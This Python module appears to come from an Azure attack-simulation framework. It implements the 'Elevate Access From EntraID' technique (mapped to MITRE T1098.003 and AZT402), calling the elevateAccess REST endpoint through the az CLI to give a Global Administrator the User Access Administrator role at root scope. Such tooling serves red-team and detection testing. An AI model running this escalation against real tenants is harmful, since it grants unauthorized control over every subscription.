from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.azure.azure_access import AzureAccess
import subprocess

@TechniqueRegistry.register
class AzureElevateAccessFromEntraId(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1098.003",
                technique_name="Account Manipulation",
                tactics=["Persistence", "Privilege Escalation"],
                sub_technique_name="Additional Cloud Roles"
            )
        ]
        azure_trm_technique = [
            AzureTRMTechnique(
                technique_id="AZT402",
                technique_name="Elevated Access Toggle",
                tactics=["Privilege Escalation"],
                sub_technique_name=None
            )
        ]
        super().__init__("Elevate Access From EntraID", "Enables configuration in Entra ID that grants 'User Access Administrator' role in Azure to a global admin in Entra ID", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            # get az full execution path
            az_command = AzureAccess().az_command
            # ref: https://learn.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin?tabs=azure-cli#step-1-elevate-access-for-a-global-administrator-2
            raw_response = subprocess.run([az_command, "rest", "--method", "post", "--url", "/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"], capture_output=True)

            if raw_response.returncode == 0:
                # successful operation has empty response
                return ExecutionStatus.SUCCESS, {
                    "message": f"Permission Granted",
                    "value": {
                        "permission_granted" : "User Access Administrator",
                        "scope" : "root (/)"
                    }
                }
            else:
                return ExecutionStatus.FAILURE, {
                    "error": str(raw_response.returncode),
                    "message": "Failed to enable configuration"
                }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to enable configuration"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {}